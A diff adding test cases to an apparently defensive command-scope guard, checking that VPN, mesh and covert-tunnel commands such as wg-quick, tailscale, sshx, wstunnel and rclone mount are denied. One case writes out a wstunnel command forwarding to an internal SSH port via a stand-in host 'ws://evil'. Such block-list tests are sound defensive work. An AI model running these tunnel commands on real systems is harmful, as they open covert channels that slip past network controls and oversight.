@@ -635,6 +635,21 @@ class TestAssertCommandInScope:
             )
         with pytest.raises(PermissionDeniedError, match="mitmproxy|Proxy/tunnel"):
             assert_command_in_scope("mitmproxy --mode socks5", scope_env=scope)
+        # RH-44 — VPN / mesh / covert tunnels + rclone mount
+        with pytest.raises(PermissionDeniedError, match="wg-quick|Proxy/tunnel"):
+            assert_command_in_scope("wg-quick up wg0", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="tailscale|Proxy/tunnel"):
+            assert_command_in_scope("tailscale up", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="clash|Proxy/tunnel"):
+            assert_command_in_scope("clash -d /tmp", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="sshx|Proxy/tunnel"):
+            assert_command_in_scope("sshx", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="wstunnel|Proxy/tunnel"):
+            assert_command_in_scope(
+                "wstunnel client -L 1080:10.0.0.1:22 ws://evil", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match="rclone mount"):
+            assert_command_in_scope("rclone mount remote: /mnt", scope_env=scope)
         # RH-33: service-discovery / DB transport env pivots.
         with pytest.raises(PermissionDeniedError, match="CONSUL_HTTP_ADDR|Transport"):
             assert_command_in_scope(
